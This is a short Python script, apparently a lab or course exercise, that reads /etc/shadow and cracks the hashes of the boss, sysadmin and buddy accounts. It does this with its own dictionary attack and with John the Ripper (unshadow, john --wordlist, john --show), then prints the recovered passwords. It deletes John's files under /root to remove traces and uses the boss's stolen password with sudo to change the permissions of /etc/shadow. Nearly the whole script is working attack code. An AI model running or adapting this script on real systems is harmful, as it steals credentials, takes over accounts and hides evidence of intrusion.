import crypt
import subprocess
import gzip

with open ("/etc/shadow") as f:
	my_input = f.readlines()

with open ("/usr/share/john/password.lst") as d:
	my_dict = d.read()

def findWord(dict,passW):
	for word in dict:
		if passW == crypt.crypt(word.lower(),passW[:16]):
			return word.lower()
	return "error: nothing found"

def getHahsedPW (userName, my_intput):
	for line in my_intput:
		word = line.split(":")
		if word[0] == userName:
			return word[1]
	return "error: no user found"	

bossName = "yourboss"
sysAdminName = "sysadmin"
bodyName ="yourbuddy"

boss_password = getHahsedPW(bossName,my_input)
sys_admin_password = getHahsedPW(sysAdminName,my_input)
your_buddy_password = getHahsedPW(bodyName,my_input)


boss_password = findWord(my_dict.split(),boss_password)
sys_admin_password = findWord(my_dict.split(),sys_admin_password)

print(boss_password)
print(sys_admin_password)



#John the ripper 
subprocess.run("unshadow /etc/passwd /etc/shadow > /tmp/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, input = boss_password , stderr=subprocess.STDOUT, shell = True)
subprocess.run("john --wordlist=/usr/share/john/password.lst /tmp/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True)
myOutPut = (subprocess.run("john --show /tmp/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True))
splited = (str(myOutPut).split(":"))
for x in range(len(splited)):
	if bodyName in splited[x]:
		print(splited[x+1])
		break


subprocess.run("rm -r /root/.john", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True)
subprocess.run("rm /root/johns_passwd", stdout = subprocess.PIPE, universal_newlines = True, stderr=subprocess.STDOUT, shell = True)


#set premission
temp = f"su {bossName} -c \"echo {boss_password} | sudo -S chmod 640 /etc/shadow\""
myOutput2 = subprocess.run(temp, stdout = subprocess.PIPE, universal_newlines = True, input = boss_password , stderr=subprocess.STDOUT, shell = True)
